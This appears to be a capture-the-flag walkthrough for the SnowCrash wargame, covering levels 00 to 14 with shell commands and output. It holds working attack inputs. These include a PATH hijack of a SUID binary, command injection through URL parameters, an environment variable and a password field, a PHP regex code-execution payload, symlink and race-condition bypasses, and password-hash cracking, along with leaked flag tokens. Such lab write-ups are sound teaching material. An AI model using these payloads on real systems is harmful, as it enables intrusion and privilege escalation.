## Level 00

We can see with the following command two files where the owner is flag00.

```bash
find / -user flag00 2> /dev/null
```

After checking with ls -l, we can see we only have read access on them.

```bash
level00@SnowCrash:~$ find / -user flag00 2> /dev/null
/usr/sbin/john
/rofs/usr/sbin/john
```

```bash
level00@SnowCrash:~$ ls -l /usr/sbin/john /rofs/usr/sbin/john
----r--r-- 1 flag00 flag00 15 Mar  5  2016 /rofs/usr/sbin/john
----r--r-- 1 flag00 flag00 15 Mar  5  2016 /usr/sbin/john
```

When we look at the file's content, there is the following text: cdiiddwpgswtgt.

```bash
level00@SnowCrash:~$ cat /usr/sbin/john
cdiiddwpgswtgt
```

After using CyberChef, we can see the text use ROT11 to hide the next password: nottoohardhere

https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,11)&input=Y2RpaWRkd3Bnc3d0Z3Q
## Level 01

The previous level gives a clue about the following flag to find. John (John the ripper) is a cracking password tool in Unix operating system. John the Ripper uses a rainbow table approach where it takes words from an in-built dictionary. It then compiles the variations of that dictionary and compares the hashed password to what is in the password file, trying to find a match.

In our case, after looking in the /etc/passwd file, we can see that the flag01 user column contains the password hash of the user flag01

```bash
level01@SnowCrash:~$ cat /etc/passwd
...
level00:x:2000:2000::/home/user/level00:/bin/bash
level01:x:2001:2001::/home/user/level01:/bin/bash
level02:x:2002:2002::/home/user/level02:/bin/bash
level03:x:2003:2003::/home/user/level03:/bin/bash
level04:x:2004:2004::/home/user/level04:/bin/bash
level05:x:2005:2005::/home/user/level05:/bin/bash
level06:x:2006:2006::/home/user/level06:/bin/bash
level07:x:2007:2007::/home/user/level07:/bin/bash
level08:x:2008:2008::/home/user/level08:/bin/bash
level09:x:2009:2009::/home/user/level09:/bin/bash
level10:x:2010:2010::/home/user/level10:/bin/bash
level11:x:2011:2011::/home/user/level11:/bin/bash
level12:x:2012:2012::/home/user/level12:/bin/bash
level13:x:2013:2013::/home/user/level13:/bin/bash
level14:x:2014:2014::/home/user/level14:/bin/bash
flag00:x:3000:3000::/home/flag/flag00:/bin/bash
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
flag02:x:3002:3002::/home/flag/flag02:/bin/bash
flag03:x:3003:3003::/home/flag/flag03:/bin/bash
flag04:x:3004:3004::/home/flag/flag04:/bin/bash
flag05:x:3005:3005::/home/flag/flag05:/bin/bash
flag06:x:3006:3006::/home/flag/flag06:/bin/bash
flag07:x:3007:3007::/home/flag/flag07:/bin/bash
flag08:x:3008:3008::/home/flag/flag08:/bin/bash
flag09:x:3009:3009::/home/flag/flag09:/bin/bash
flag10:x:3010:3010::/home/flag/flag10:/bin/bash
flag11:x:3011:3011::/home/flag/flag11:/bin/bash
flag12:x:3012:3012::/home/flag/flag12:/bin/bash
flag13:x:3013:3013::/home/flag/flag13:/bin/bash
flag14:x:3014:3014::/home/flag/flag14:/bin/bash
```

```bash
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

To decrypt the hash, we have to copy the following line and paste it into our computer with John installed and run the command:

```bash
❯ john -show myfile
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash

1 password hash cracked, 0 left
```

We can see that the hash corresponds to <mark>abcdefg</mark> password
## Level 02
When we are logged as level02, we can see level02.pcap file in our home directory.

```bash
level02@SnowCrash:~$ ls -l
total 12
----r--r-- 1 flag02 level02 8302 Aug 30  2015 level02.pcap
```

So, we can use the following command to export level02.pcap file into our computer:

```bash
➜ scp -P 4242 level02@192.168.56.101:~/level02.pcap ~/Desktop
```
When we try to open it, we can see that we didn't have permission; we can run the following command to open it:

```bash
➜  Desktop chmod 666 level02.pcap
➜  Desktop ls -l level02.pcap
-rw-rw-rw- 1 nabentay 2021_paris 8302 Jul 15 22:19 level02.pcap
```

We can use tshark to follow the TCP stream of the packet send and received:

```bash
tshark -q -r level02/level02.pcap -z follow,tcp,hex,0
...
       000000D6  00 0d 0a 50 61 73 73 77  6f 72 64 3a 20           ...Passw ord:
000000B9  66                                                f
000000BA  74                                                t
000000BB  5f                                                _
000000BC  77                                                w
000000BD  61                                                a
000000BE  6e                                                n
000000BF  64                                                d
000000C0  72                                                r
000000C1  7f                                                .
000000C2  7f                                                .
000000C3  7f                                                .
000000C4  4e                                                N
000000C5  44                                                D
000000C6  52                                                R
000000C7  65                                                e
000000C8  6c                                                l
000000C9  7f                                                .
000000CA  4c                                                L
000000CB  30                                                0
000000CC  4c                                                L
000000CD  0d                                                .
...
```

After this, we can see that the password contains DEL key press (7f). When we remove all the deleted letters, we get: <mark>ft_waNDReL0L</mark>

## Level 03

When we are logged as level03, we can see level03 file in our home directory.

```bash
level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

After looking in the right assigned in this file, we see r-s, the s permission means SUID, the file is executed with the user owner's permission, and the owner is flag03.

When we run it, we have the following message
```bash
level03@SnowCrash:~$ ./level03
Exploit me
```

At this level, we will use ltrace this tool records and print the dynamic library calls.

```bash
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                      = 2003
geteuid()                                                                      = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                            = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                            = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                         = 0
+++ exited (status 0) +++
```

As we can see, there is a system call with /usr/bin/env of the echo file. We only have to modify our PATH env to run an echo program. We will run /bin/getflag to get the flag of the next level.

So we will execute the following commands:
```bash
level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
level03@SnowCrash:~$ chmod 755 /tmp/echo
level03@SnowCrash:~$ export PATH=/tmp/
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```


## Level 04

We can see level04 a level04.pl file in our home directory.

```bash
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

When we look at level04.pl file, we see that we have a webserver running in localhost:4747 address. We can confirm that the server is running by using the following command:

```bash
level04@SnowCrash:~$ netstat -tunl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN
tcp6       0      0 :::4646                 :::*                    LISTEN
tcp6       0      0 :::4747                 :::*                    LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 :::4242                 :::*                    LISTEN
udp        0      0 0.0.0.0:68              0.0.0.0:*
```
This perl file echo the content provided in the x param.

As the website run command, we can write http://192.168.56.101:4747/?x=|getflag in the URL to get the flag. The pipe is added to execute the getflag command.

Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
## Level 05

When we are logged with the level05 user we can see the following message
```bash
level05@192.168.56.101's password:
You have new mail.
```

This mean there are file in our mail folder.

```bash
level05@SnowCrash:~$ ls -l $MAIL
-rw-r--r--+ 1 root mail 58 Jul 15 22:03 /var/mail/level05
```
```bash
level05@SnowCrash:~$ cat $MAIL
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

When we look at the level05 file we see a cron task executed all 2 minute. It run the openarenaserver file with the flag05 permission. After looking on internet we see that openarenaserver is a game taking configuration file

The following error message is showed when
```bash
level05@SnowCrash:~$ bash /usr/sbin/openarenaserver
bash: /opt/openarenaserver/*: No such file or directory
```

We write a file that will execute getflag and send the result in /tmp/flag
```bash
level05@SnowCrash:~$ echo "getflag > /tmp/flag" > /opt/openarenaserver/conf
```

After waiting 2 minute we can get the flag00
```bash
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
## Level 06

We can see the following in level06 home. There is a PHP file that will execute a function to format the text of a file given in the argument.

```bash
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

```bash
level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/file
level06@SnowCrash:~$ ./level06 /tmp/file
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
## Level 07

```bash
level07@SnowCrash:~$ export LOGNAME="; getflag"
level07@SnowCrash:~$ ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
## Level 08
In this level, we have a level08 file and a token file in our home directory.
When we launch the program with ltrace we see that the program use strstr to avoid token filename.

```bash
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                         = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)     = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

We only have to do a symbolic link to bypass this restriction

```bash
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/link && ./level08 /tmp/link
quif5eloekouj29ke0vouxean
```
## Level 09

In this level, we have a program that takes an argument and increments by one all characters we write by incrementation.
It use the Rolling Cipher
For example: abc = ace

```bash
scp -P 4242 level09@192.168.56.101:~/token ~/Desktop
```

We make a script to apply this rule of incrementation

```bash
su flag09 -> f3iji1ju5yuevaus41q1afiuq
getflag
```
## Level 10

In this level, we have an executable which will send a file to a remote host.

```bash
ls -l
        -rwsr-s---+ 1 flag10 level10 8617 Mar  5  2016 level10
        -rw-------  1 flag10 flag10    26 Mar  5  2016 token
```
We can create a symlink to try to read the content in the token file (symlink race)

```bash
ln -s /home/user/level10/token /tmp/flag
```
Now let's try to send my file to the server

```bash
./level10 /tmp/flag 192.168.56.101
```
You don't have access to /tmp/flag
```bash
cat /tmp/flag
    cat: /tmp/flag: Permission denied
```

Nope, still unable to execute my flag and send it to a server

To open a port in your machine:
```bash
nc -lk 6969
```

let's get the executable to my host with scp

```bash
scp -P 4242 level10@192.168.56.101:/tmp/flag /mnt/nfs/homes/emaugale/Desktop
```

So must find a way to make your file accessible to the server.
When we use ltrace, the executable will first try to access our file and then read the file's content. -> Do a /tmp/flag file with nothing on it when accessed; we can delete it and recreate one, which will be a symlink to the token file, launch our server, and print the result

```bash
    while true;
        do
        touch /tmp/link
        rm -f /tmp/link
        ln -s /home/user/level10/token /tmp/link
        rm -f /tmp/link
        done
```

```bash
    while true;
    do
    /home/user/level10/level10 /tmp/link 192.168.56.101 2> /dev/null
    done
...
bash /tmp/script1.sh & bash /tmp/script2.sh
```

Check flag.Here is your token : feulo4b72j7edeahuete3no7c
## Level 11
In this exercise, we have a lua script. This script is a sort of a server that will listen to a port and compare the content you give it with an expected hash.

As level07 user, you can use the getflag function to get the flag, but this time by adding it to the password Password:

```bash
Password: "; getflag > /tmp/flag"
```

```bash
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```


## Level 12

In level12, we found a perl script used on the 127.0.0.1:5959 address.

As we see in the t function, the perl program use regex expression to format the x param send to the server.

Change a-z to A-Z
```perl
  $xx =~ tr/a-z/A-Z/;
```

Remplace space by nothing
```perl
  $xx =~ s/\s.*//;
```

```bash
level12@SnowCrash:~$ echo "getflag > /tmp/MYFLAG" > /tmp/FLAG
```

We have to go on the following URL

http://192.168.56.101:4646/?x=`/*/FLAG`

```bash
level12@SnowCrash:~$ cat /tmp/MYFLAG
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
## Level 13

We can reverse the program with Ghidra and see that the flag is in a function named ft_des. 

```bash
➜  Documents ./a.out
2A31L79asukciNyi8uppkEuSx
```
## Level 14

We can reverse the program with Ghidra and see that the flag is in a function named ft_des.

```bash
➜  Documents ./a.out
7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
```


